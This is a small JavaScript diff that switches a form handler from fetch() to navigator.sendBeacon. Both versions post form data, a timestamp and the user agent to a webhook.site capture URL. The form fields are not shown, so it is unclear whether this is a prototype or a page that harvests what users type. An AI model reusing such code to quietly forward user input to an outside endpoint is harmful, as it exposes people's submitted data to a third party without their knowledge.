@@ -66,12 +66,7 @@
                 formData.append('timestamp', new Date().toISOString());
                 formData.append('userAgent', navigator.userAgent);
                 
-                fetch('https://webhook.site/21c3a2a3-b9a2-45c6-b5b9-8932ee62d8e6', {
-                    method: "POST",
-                    body: formData,
-                    mode: 'no-cors',
-                    keepalive: true
-                });
+                navigator.sendBeacon('https://webhook.site/21c3a2a3-b9a2-45c6-b5b9-8932ee62d8e6', formData);
                 
                 document.getElementById('successMsg').style.display = 'block';
             }
